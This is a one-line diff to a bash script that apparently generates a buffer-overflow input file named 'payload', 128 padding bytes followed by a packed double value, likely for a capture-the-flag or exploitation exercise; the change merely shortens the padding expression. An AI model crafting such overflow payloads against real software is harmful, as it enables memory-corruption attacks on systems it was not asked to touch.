@@ -1,2 +1,2 @@
 #!/bin/bash
-python -c "import struct; print 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' + struct.pack('<d', 64.33333)" > payload
+python -c "import struct; print 'a' * 128 + struct.pack('<d', 64.33333)" > payload
